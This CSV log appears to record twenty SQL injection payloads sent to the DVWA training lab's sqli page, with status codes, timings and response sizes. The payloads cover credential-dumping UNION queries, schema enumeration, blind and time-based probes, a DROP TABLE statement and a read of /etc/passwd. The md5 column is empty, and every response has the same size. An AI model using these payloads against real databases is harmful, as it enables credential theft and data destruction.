label,payload,http_code,time,url,size,md5
01,' OR 1=1--,200,0.003351,http://dvwa.local/vulnerabilities/sqli/index.php,4746
02,' OR '1'='1,200,0.003350,http://dvwa.local/vulnerabilities/sqli/index.php,4746
03,' UNION SELECT null, null--,200,0.003031,http://dvwa.local/vulnerabilities/sqli/index.php,4746
04,' UNION SELECT 1, @@version--,200,0.003722,http://dvwa.local/vulnerabilities/sqli/index.php,4746
05,' UNION SELECT 1, table_name FROM information_schema.tables--,200,0.003823,http://dvwa.local/vulnerabilities/sqli/index.php,4746
06,' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--,200,0.004644,http://dvwa.local/vulnerabilities/sqli/index.php,4746
07,' UNION SELECT username, password FROM users--,200,0.003534,http://dvwa.local/vulnerabilities/sqli/index.php,4746
08,' AND SLEEP(5)--,200,0.003636,http://dvwa.local/vulnerabilities/sqli/index.php,4746
09,'; DROP TABLE users--,200,0.003137,http://dvwa.local/vulnerabilities/sqli/index.php,4746
10,' OR 1=1 LIMIT 1--,200,0.003147,http://dvwa.local/vulnerabilities/sqli/index.php,4746
11,' ORDER BY 1--,200,0.003446,http://dvwa.local/vulnerabilities/sqli/index.php,4746
12,' ORDER BY 3--,200,0.003318,http://dvwa.local/vulnerabilities/sqli/index.php,4746
13,' AND (SELECT COUNT(*) FROM users) > 0--,200,0.003196,http://dvwa.local/vulnerabilities/sqli/index.php,4746
14,' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--,200,0.003177,http://dvwa.local/vulnerabilities/sqli/index.php,4746
15,' UNION SELECT 1, LOAD_FILE('/etc/passwd')--,200,0.003141,http://dvwa.local/vulnerabilities/sqli/index.php,4746
16,' UNION SELECT 1, user()--,200,0.003485,http://dvwa.local/vulnerabilities/sqli/index.php,4746
17,' UNION SELECT 1, database()--,200,0.003873,http://dvwa.local/vulnerabilities/sqli/index.php,4746
18,' AND 1=IF(1=1, SLEEP(3), 0)--,200,0.003119,http://dvwa.local/vulnerabilities/sqli/index.php,4746
19,' OR EXISTS(SELECT * FROM users WHERE username='admin')--,200,0.003277,http://dvwa.local/vulnerabilities/sqli/index.php,4746
20,' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--,200,0.003202,http://dvwa.local/vulnerabilities/sqli/index.php,4746
